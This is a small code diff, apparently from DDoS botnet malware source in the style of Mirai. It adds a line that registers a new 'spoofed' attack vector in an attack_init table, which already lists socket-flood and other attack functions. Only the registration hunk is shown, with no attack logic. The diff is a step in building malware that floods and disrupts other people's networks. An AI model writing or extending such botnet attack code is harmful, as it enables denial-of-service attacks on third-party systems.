@@ -45,6 +45,7 @@ BOOL attack_init(void)
     add_attack(ATK_VEC_RS_MEDIA, (ATTACK_FUNC)attack_rs_media);
     add_attack(ATK_VEC_SOCKET, (ATTACK_FUNC)attack_socket_flood);
     add_attack(ATK_VEC_ZCONNECT, (ATTACK_FUNC)attack_zconnect);
+    add_attack(ATK_VEC_SPOOFED, (ATTACK_FUNC)attack_spoofed);
     return TRUE;
 }
 
